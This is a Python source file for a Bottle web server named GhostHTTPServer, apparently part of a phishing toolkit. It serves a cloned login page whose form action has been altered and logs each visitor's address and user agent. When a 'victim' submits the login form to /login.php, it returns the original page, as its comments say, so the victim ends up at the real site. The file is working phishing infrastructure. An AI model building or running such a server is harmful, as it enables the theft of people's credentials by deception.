import os
import sys
from bottle import (route,request,static_file,post,run)                 # Bottle Framework - a multiple http server framework like django but smaller

class GhostHTTPServer(object):
    '''HTTP Server thread'''
    def __init__(self,host,port,html_folder,cwd):
        self.host= host
        self.port = port
        self.html_folder = html_folder
        self.cwd = cwd
        self.path = (self.cwd + '/HTTP-Webscript/' + 'index.html')

    def original_source(self):
        html_file = open('/tmp/original.html')
        html_source = str(html_file.read())
        html_file.close()
        return html_source

    def fake_source_code(self):
        html_file = open(self.path)
        html_source = str(html_file.read())
        html_file.close()
        return html_source

    def write_log(self,message):
        log_file = open('/tmp/response.log','a+')
        log_file.write(message + '\n')
        log_file.close()


    def run(self):
        @route('/')
        def index():
            string = str(request['REMOTE_HOST'] + '  ---  ' +
                        request['HTTP_USER_AGENT'])
            self.write_log(string)
            return self.fake_source_code()                           # HTTP source code with modified action variable

        @route('/' + self.html_folder + '/:filename#.*#')       # e.g   @route('/foobar_files/:filename#.*#')
        def path_file(filename):
            return static_file(filename,root= self.cwd + '/HTTP-Webscript/'+ self.html_folder)

        @post('/login.php')                                     # redirect the victim to the original web server
        def login():
            return self.original_source()                        # HTTP source code with original action variable

        run(host= str(self.host),port=int(self.port))           # run(host='127.0.0.1',port=80)


# GhostHTTPServer('0.0.0.0',80,'index_files','/root/Webscript')
GhostServer = GhostHTTPServer('0.0.0.0',(sys.argv[1]),(sys.argv[2]),(sys.argv[3]))  # This will be called by the main ghost application through subprocess for control reasons
GhostServer.run()




